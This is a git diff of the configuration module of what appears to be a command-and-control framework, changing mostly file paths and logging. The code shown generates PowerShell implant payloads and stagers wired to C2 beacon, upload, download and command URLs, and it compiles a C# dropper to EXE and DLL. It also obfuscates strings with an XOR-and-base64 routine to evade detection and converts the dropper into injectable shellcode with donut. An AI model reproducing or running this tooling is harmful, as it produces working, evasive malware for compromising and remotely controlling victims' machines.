@@ -1,13 +1,14 @@
 # Embedded file name: core\config.py
+import base64
+import string
+import subprocess
+
+import donut
+from rich.console import Console
 from core.Encryption import generate_key
 from core.Obfuscate import *
-import os, base64, random, codecs, glob, readline, re
-from Crypto import Random
-import subprocess
-import string
-import core.config
-import donut
 
+campaign_name = '{NAME}'
 PORT = '{PORT}'
 VERSION = '2.0'
 AGENTS = dict()
@@ -33,105 +34,106 @@ AESKey=base64.b64encode(bytearray("".join([random.choice(string.ascii_uppercase)
 {URL}
 
 
+console = Console(style="red")
+
 def PAYLOAD():
     global HOST
     global PORT
-    fp = open('agents/payload2.ps1', 'r')
+    fp = open('core/agents/payload2.ps1', 'r')
     ps1 = fp.read()
-    if SSL==True:
-        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{beacon}', beacon).replace('{register}', register_url).replace('{download}', download_url).replace('{upload}', upload_url).replace('{image}', image_url).replace('{cmd}', command_url).replace('{re}', result_url).replace('{md}', modules_url).replace('{HTTP}', "https").replace('{DATE}', KDATE)
-    else :
-        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{beacon}', beacon).replace('{register}', register_url).replace('{download}', download_url).replace('{upload}', upload_url).replace('{image}', image_url).replace('{cmd}', command_url).replace('{re}', result_url).replace('{md}', modules_url).replace('{HTTP}', "http").replace('{DATE}', KDATE)
-    payload= open('payloads/raw_payload.ps1', 'w')
+    if SSL:
+        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{beacon}', beacon).replace('{register}', register_url).replace('{download}', download_url).replace('{upload}', upload_url).replace('{image}', image_url).replace('{cmd}',command_url).replace('{re}', result_url).replace('{md}', modules_url).replace('{HTTP}', "https").replace('{DATE}', KDATE)
+    else:
+        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{beacon}', beacon).replace('{register}', register_url).replace('{download}', download_url).replace('{upload}', upload_url).replace('{image}', image_url).replace('{cmd}',command_url).replace('{re}', result_url).replace('{md}', modules_url).replace('{HTTP}', "http").replace('{DATE}', KDATE)
+    payload = open('utils/payloads/Powershell/raw_payload.ps1', 'w')
     payload.write(ps1)
     payload.close()
+    console.log("[green][+] Raw Payload written to:[/green] [cyan]utils/payloads/Powershell/raw_payload.ps1[/cyan]")
     return ps1
+
 
 def STAGER():
     global HOST
     global PORT
-    fp = open('agents/stager.ps1', 'r')
+    fp = open('core/agents/stager.ps1', 'r')
     ps1 = fp.read()
-    if SSL==True:
-        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{b64payload}', b64_payload).replace('{HTTP}', "https")
+    if SSL:
+        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{b64payload}', b64_payload).replace('{HTTP}',"https")
     else:
-        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{b64payload}', b64_payload).replace('{HTTP}', "http")
-    payload= open('payloads/base64_stager.ps1', 'w')
+        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{b64payload}', b64_payload).replace('{HTTP}',"http")
+    payload = open('utils/payloads/Powershell/base64_stager.ps1', 'w')
     payload.write(ps1)
     payload.close()
+    console.log("[green][+] Stager Payload written to:[/green] [cyan]utils/payloads/Powershell/base64_stager.ps1[/cyan]")
     return ps1
 
+
 def cspayload():
-    fp = open('agents/simple_dropper.ninja', 'r')
-    fpo= open('payloads/cs_dropper.cs', 'w')
+    fp = open('core/agents/simple_dropper.ninja', 'r')
+    fpo = open('utils/payloads/Executables/cs_dropper.cs', 'w')
     cs = fp.read()
-    if SSL==True:
-        cs = cs.replace('{ip}', csobf(HOST)).replace('{port}', csobf(PORT)).replace('{b64_stager}', csobf(b64_stager)).replace('{http}', csobf("https://"))
+    if SSL:
+        cs = cs.replace('{ip}', csobf(HOST)).replace('{port}', csobf(PORT)).replace('{b64_stager}',csobf(b64_stager)).replace('{http}', csobf("https://"))
     else:
-        cs = cs.replace('{ip}', csobf(HOST)).replace('{port}', csobf(PORT)).replace('{b64_stager}', csobf(b64_stager)).replace('{http}', csobf("http://"))
+        cs = cs.replace('{ip}', csobf(HOST)).replace('{port}', csobf(PORT)).replace('{b64_stager}',csobf(b64_stager)).replace('{http}', csobf("http://"))
 
     fpo.write(cs)
     fpo.close()
     fp.close()
-    exe="mono-csc -r:lib/System.Management.Automation.dll payloads/cs_dropper.cs -out:payloads/dropper_cs.exe -target:exe -warn:2"
-    dll="mono-csc -r:lib/System.Management.Automation.dll payloads/cs_dropper.cs -out:payloads/dropper_cs.dll -target:library -warn:2"
+    exe = "mono-csc -r:core/lib/System.Management.Automation.dll utils/payloads/Executables/cs_dropper.cs -out:utils/payloads/Executables/dropper_cs.exe -target:exe -warn:2"
+    dll = "mono-csc -r:core/lib/System.Management.Automation.dll utils/payloads/Executables/cs_dropper.cs -out:utils/payloads/Executables/dropper_cs.dll -target:library -warn:2"
     try:
         subprocess.check_output(dll, shell=True)
-        print ("C# Dropper DLL written to: payloads/payload_cs.dll")
+        console.log("[green][+] C# Dropper DLL written to:[/green] [cyan]utils/payloads/Executables/dropper_cs.dll[/cyan]")
     except Exception as e:
-        print ('[-] ERROR generating csharp payload : %s' % str(e))
+        console.print('[-] ERROR generating csharp payload : %s' % str(e))
     try:
         subprocess.check_output(exe, shell=True)
-        print ("C# Dropper EXE written to: payloads/dropper_cs.exe")
+        console.log("[green][+] C# Dropper EXE written to:[/green] [cyan]utils/payloads/Executables/dropper_cs.exe[/cyan]")
     except Exception as e:
-        print ('[-] ERROR generating csharp payload : %s' % str(e))
+        console.print('[-] ERROR generating csharp payload : %s' % str(e))
+
 
 def obfuscate():
     global obfuscated
-    #cmd="""pwsh -c \"./Out-ObfuscatedStringCommand.ps1;Out-ObfuscatedStringCommand -Path payloads/raw_payload.ps1 -ObfuscationLevel 3 > payloads/payload-obf.ps1\" """
-    #cmd="""pwsh -c \"Import-Module ./lib/Invoke-Obfuscation/Invoke-Obfuscation.psd1;Out-EncodedBinaryCommand -Path payloads/raw_payload.ps1 -NoProfile -NonInteractive -PassThru > payloads/payload-obf.ps1\" """
+    # cmd="""pwsh -c \"./Out-ObfuscatedStringCommand.ps1;Out-ObfuscatedStringCommand -Path payloads/raw_payload.ps1 -ObfuscationLevel 3 > payloads/payload-obf.ps1\" """
+    # cmd="""pwsh -c \"Import-Module ./lib/Invoke-Obfuscation/Invoke-Obfuscation.psd1;Out-EncodedBinaryCommand -Path payloads/raw_payload.ps1 -NoProfile -NonInteractive -PassThru > payloads/payload-obf.ps1\" """
     try:
-        #subprocess.check_output(cmd, shell=True)
-        f=open("payloads/raw_payload.ps1","rb")
-        payload=f.read()
-        f=open("payloads/payload-obf.ps1","w")
+        # subprocess.check_output(cmd, shell=True)
+        f = open("utils/payloads/Powershell/raw_payload.ps1", "rb")
+        payload = f.read()
+        f = open("utils/payloads/Powershell/payload-obf.ps1", "w")
         f.write(obfvar(payload.decode("UTF-8")))
         f.close()
-        print("obfuscated payload written to: payloads/payload-obf.ps1")
-        #obfuscated=True
+        console.log("[green][+] Obfuscated payload written to:[/green] [cyan]utils/payloads/Powershell/payload-obf.ps1[/cyan]")
+        # obfuscated=True
     except Exception as e:
-        print ('[-] ERROR generating obfuscated payload : %s' % str(e))
+        console.print('[-] ERROR generating obfuscated payload : %s' % str(e))
 
 
 def Obfuscated_PAYLOAD():
-    f=open("payloads/raw_payload.ps1","rb")
-    payload=f.read()
+    f = open("utils/payloads/Powershell/raw_payload.ps1", "rb")
+    payload = f.read()
     return obfvar(payload.decode("UTF-8"))
-    """
-    if obfuscated==True:
-        f=open("payloads/payload-obf.ps1","rb")
-        payload=f.read()
-        return payload
-    else:
-
-        return obfuscate()
-    """
 
 
 def migrator():
-    shellcode=donut.create(file="payloads/dropper_cs.exe")
-    fp = open('agents/Migrator.ninja', 'r')
+    shellcode = donut.create(file="utils/payloads/Executables/dropper_cs.exe")
+    fp = open('core/agents/Migrator.ninja', 'r')
     temp = fp.read()
-    temp=temp.replace('{shellcode}',base64.b64encode(shellcode).decode("utf-8")).replace('{class}',"".join([random.choice(string.ascii_uppercase) for i in range(5)]))
-    output=open('Modules/Migrator.ps1', 'w')
+    temp = temp.replace('{shellcode}', base64.b64encode(shellcode).decode("utf-8")).replace('{class}', "".join(
+        [random.choice(string.ascii_uppercase) for i in range(5)]))
+    output = open('Modules/Migrator.ps1', 'w')
     output.write(temp)
     output.close()
+    console.log("[green][+] Migrator payload written to:[/green] [cyan]Modules/Migrator.ps1[/cyan]")
 
 def csobf(str):
-    d=""
+    d = ""
     for i in str:
-        d=d+chr((ord(i)+10)^50)
-    return base64.b64encode(bytearray(d,"UTF-8")).decode("UTF-8")
+        d = d + chr((ord(i) + 10) ^ 50)
+    return base64.b64encode(bytearray(d, "UTF-8")).decode("UTF-8")
+
 
 def set_port(in_port):
     global PORT
@@ -156,11 +158,13 @@ def set_ip(in_ip):
 def set_time(id, in_time):
     TIME[id] = in_time - TIME[id]
 
+
 def get_pointer():
     global POINTER
     return POINTER
 
+
 def set_key():
     global AESKey
-    AESKey=generate_key()
-    #print  AESKey
+    AESKey = generate_key()
+    # print  AESKey
